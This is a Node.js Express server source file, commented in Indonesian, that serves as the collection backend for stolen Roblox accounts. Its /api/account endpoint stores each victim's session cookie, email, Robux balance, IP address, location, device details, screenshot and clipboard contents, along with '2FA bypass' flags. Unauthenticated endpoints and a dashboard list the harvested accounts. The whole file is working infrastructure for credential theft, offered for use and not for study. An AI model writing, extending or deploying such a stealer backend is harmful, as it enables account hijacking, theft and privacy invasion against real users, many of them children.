const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

const DATA_FILE = process.env.DATA_PATH || path.join(__dirname, 'accounts.json');
const dataDir = path.dirname(DATA_FILE);
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
        accounts: [],
        logs: [],
        stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null }
    }, null, 2));
}

function readData() {
    try {
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        if (!raw || raw.trim() === '' || raw.trim() === '[]' || raw.trim() === '{}') {
            return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
        }
        const parsed = JSON.parse(raw);
        if (!parsed.accounts) parsed.accounts = [];
        if (!parsed.logs) parsed.logs = [];
        if (!parsed.stats) parsed.stats = { totalAccounts: 0, totalRobux: 0, lastUpdate: null };
        return parsed;
    } catch (e) {
        return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
    }
}

function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ========== RECEIVE ACCOUNT DATA (dengan IP, lokasi, device, screenshot, clipboard) ==========
app.post('/api/account', async (req, res) => {
    try {
        const accountData = req.body;
        if (!accountData.userId) {
            const data = readData();
            data.logs.push({
                type: accountData.type || 'unknown',
                receivedAt: new Date().toISOString(),
                ip: req.ip,
                payload: JSON.stringify(accountData).substring(0, 500)
            });
            if (data.logs.length > 500) data.logs = data.logs.slice(-500);
            writeData(data);
            return res.json({ success: true, message: 'Logged (no userId)' });
        }

        const data = readData();
        accountData.receivedAt = new Date().toISOString();
        accountData.id = String(accountData.userId);
        accountData.ip = req.ip || req.connection.remoteAddress;

        // Ambil screenshot, clipboard, ip, location, device dari body
        const { screenshot, clipboard, ip, location, device, ...rest } = accountData;

        const existingIndex = data.accounts.findIndex(acc => String(acc.userId) === String(accountData.userId));

        const newAccount = {
            ...rest,
            userId: accountData.userId,
            username: accountData.username,
            displayName: accountData.displayName,
            robux: accountData.robux || 0,
            friends: accountData.friends || 0,
            premium: accountData.premium || false,
            accountAge: accountData.accountAge || 'N/A',
            email: accountData.email || 'Hidden',
            emailVerified: accountData.emailVerified || false,
            twoFAEnabled: accountData.twoFAEnabled || false,
            inventoryValue: accountData.inventoryValue || 0,
            inventoryCount: accountData.inventoryCount || 0,
            badgesCount: accountData.badgesCount || 0,
            groupsCount: accountData.groupsCount || 0,
            limiteds: accountData.limiteds || 0,
            cookie: accountData.cookie || '',
            // Data tambahan
            ip: ip || 'Unknown',
            location: location || { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown' },
            device: device || { platform: 'Unknown', userAgent: 'Unknown', language: 'Unknown', cores: 'Unknown' },
            screenshot: screenshot || null,  // base64 string
            clipboard: clipboard || { text: '', hasData: false },
            bypass2FA: accountData.bypass2FA || false,
            bypassEmail: accountData.bypassEmail || false,
            createdAt: accountData.createdAt || new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        if (existingIndex !== -1) {
            // Update, pertahankan createdAt asli
            const old = data.accounts[existingIndex];
            data.accounts[existingIndex] = {
                ...old,
                ...newAccount,
                createdAt: old.createdAt || newAccount.createdAt,
                updatedAt: new Date().toISOString()
            };
        } else {
            data.accounts.push(newAccount);
            data.stats.totalAccounts = data.accounts.length;
        }

        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (Number(acc.robux) || 0), 0);
        data.stats.lastUpdate = new Date().toISOString();

        data.logs.push({
            type: 'account_received',
            userId: accountData.userId,
            username: accountData.username,
            timestamp: new Date().toISOString(),
            ip: req.ip
        });
        if (data.logs.length > 500) data.logs = data.logs.slice(-500);

        writeData(data);
        res.json({ success: true, message: existingIndex !== -1 ? 'Account updated' : 'Account saved' });

    } catch (error) {
        console.error('❌ Error saving account:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET ALL ACCOUNTS ==========
app.get('/api/accounts', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            accounts: data.accounts,
            stats: data.stats,
            total: data.accounts.length
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET SINGLE ACCOUNT ==========
app.get('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        const account = data.accounts.find(a => String(a.userId) === String(req.params.id));
        if (account) res.json({ success: true, account });
        else res.status(404).json({ success: false, error: 'Not found' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== DELETE ACCOUNT ==========
app.delete('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        data.accounts = data.accounts.filter(a => String(a.userId) !== String(req.params.id));
        data.stats.totalAccounts = data.accounts.length;
        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (Number(acc.robux) || 0), 0);
        data.logs.push({ type: 'account_deleted', userId: req.params.id, timestamp: new Date().toISOString() });
        if (data.logs.length > 500) data.logs = data.logs.slice(-500);
        writeData(data);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET STATS ==========
app.get('/api/stats', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            stats: data.stats,
            recentLogs: data.logs.slice(-20)
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== DASHBOARD ==========
app.get('/dashboard', (req, res) => {
    const htmlPath = path.join(__dirname, 'public', 'dashboard.html');
    if (fs.existsSync(htmlPath)) res.sendFile(htmlPath);
    else res.json({ message: 'Dashboard HTML not found' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Data file: ${DATA_FILE}`);
});
